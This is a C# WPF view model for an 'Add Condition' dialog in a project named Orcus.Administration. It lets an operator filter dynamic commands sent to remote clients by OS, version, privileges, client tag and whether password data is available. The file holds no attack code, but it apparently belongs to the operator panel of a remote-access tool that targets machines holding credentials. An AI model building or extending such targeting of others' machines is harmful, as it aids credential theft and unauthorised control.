using System.Collections.Generic;
using System.Linq;
using Orcus.Administration.ViewModels.AddCondition;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.DynamicCommands;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels
{
    public class AddConditionViewModel : PropertyChangedBase
    {
        private RelayCommand _addConditionCommand;
        private bool? _dialogResult;
        private IConditionViewModel _selectedCondition;

        public AddConditionViewModel() : this(null)
        {
        }

        public AddConditionViewModel(Condition condition)
        {
            Conditions = new List<IConditionViewModel>
            {
                new VersionConditionViewModel(),
                new OperatingSystemConditionViewModel(),
                new PrivilegesConditionViewModel(),
                new PasswordDataAvailableConditionViewModel(),
                new ClientBinaryFrameworkVersionConditionViewModel(),
                new ClientTagConditionViewModel()
            };

            SelectedCondition = Conditions[0];
            if (condition != null)
            {
                var existingCondition = Conditions.FirstOrDefault(x => x.Condition.GetType() == condition.GetType());
                if (existingCondition != null)
                {
                    existingCondition.Initialize(condition);
                    SelectedCondition = existingCondition;
                }
            }
            else
                IsCreatingNewCondition = true;
        }

        public Condition NewCondition { get; private set; }
        public List<IConditionViewModel> Conditions { get; set; }

        public IConditionViewModel SelectedCondition
        {
            get { return _selectedCondition; }
            set { SetProperty(value, ref _selectedCondition); }
        }

        public bool? DialogResult
        {
            get { return _dialogResult; }
            set { SetProperty(value, ref _dialogResult); }
        }

        public RelayCommand AddConditionCommand
        {
            get
            {
                return _addConditionCommand ?? (_addConditionCommand = new RelayCommand(parameter =>
                {
                    if (SelectedCondition.Validate(WindowServiceInterface.Current.GetCurrentWindow()))
                    {
                        NewCondition = SelectedCondition.Condition;
                        DialogResult = true;
                    }
                }));
            }
        }

        public bool IsCreatingNewCondition { get; set; }
    }
}